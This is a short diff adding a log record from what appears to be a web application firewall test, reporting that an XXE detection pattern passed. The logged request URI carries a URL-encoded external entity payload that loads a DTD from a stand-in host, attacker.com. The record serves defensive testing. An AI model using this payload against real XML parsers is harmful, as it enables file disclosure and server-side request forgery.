@@ -1,0 +1,5 @@
+Pattern ID: XXE_ENTITY_002
+        Status: passed
+        Latency: ~27000ms
+        Detection: 1 / 1
+        Rule: [NGINX XXE Attack] DOCTYPE/ENTITY injection test_id=XXE_ENTITY_002-1768052068711-x1ve3m pattern_id=XXE_ENTITY_002 uri=/?q=%3C!ENTITY%20%25%20dtd%20SYSTEM%20%22http%3A%2F%2Fattacker.com%2Fevil.dtd%22%3E client=127.0.0.1
